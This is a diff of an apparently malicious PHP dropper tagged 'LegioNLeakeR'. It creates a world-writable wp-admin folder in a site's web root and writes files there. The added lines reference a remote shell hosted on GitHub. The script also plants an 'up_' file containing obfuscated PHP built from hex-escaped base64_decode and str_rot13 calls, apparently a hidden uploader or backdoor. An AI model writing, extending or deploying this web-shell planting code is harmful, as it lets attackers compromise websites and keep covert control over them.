@@ -1,31 +1,38 @@
 <?php 
-echo "LegioNLeakeR";
-echo "\n";
 $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 function file_name($url)
 {
-  if (preg_match('/\/([^\/]+)$/', $url, $matches)) {
-    $x = $matches[1];
-    if ($x === "index.php"){
-        $x = "L1uRo3yM.php";
-        return $x;
-    }else{
+    if (preg_match('/\/([^\/]+)$/', $url, $matches)) {
+        $x = $matches[1];
         return $x;
     }
-  }
 }
-$test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
+$test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/'; 
 if (!file_exists($test_dir)) {
-  if (mkdir($test_dir)) {
-    echo "OK";
-  } else {
-    echo "Fail Create-Folder";
-  }
+   
+    if (mkdir($test_dir,0777)) {
+        echo "OK1";
+    } else {
+        echo "Fail Create-Folder";
+    }
 } else {
-  echo "OK";
+    echo "OK1 Exists";
 }
- 
-$path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);
+// 
+$path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url); 
+$sh = "https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php";
+$f = fopen($path, "w");
+if ($f === false) {
+    @file_put_contents($path, $sh);
+} else {
+    $bytes_written = fwrite($f, $sh);
+    fclose($f);
+    if ($bytes_written === false || $bytes_written < strlen($sh)) {
+        @file_put_contents($path, $sh);
+    }
+}
+// 
+$path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/up_' . file_name($url);
 $sh_u = '<?php
 $_ = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
 $__ = "\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
@@ -36,6 +43,6 @@ $fu = fopen($path_u, "w");
 if ($fu === false) {
     @file_put_contents($path_u, $sh_u);
 } else {
-    $bytes_written = fwrite($fu, $sh_u);
+    fwrite($fu, $sh_u);
     fclose($fu);
 } 
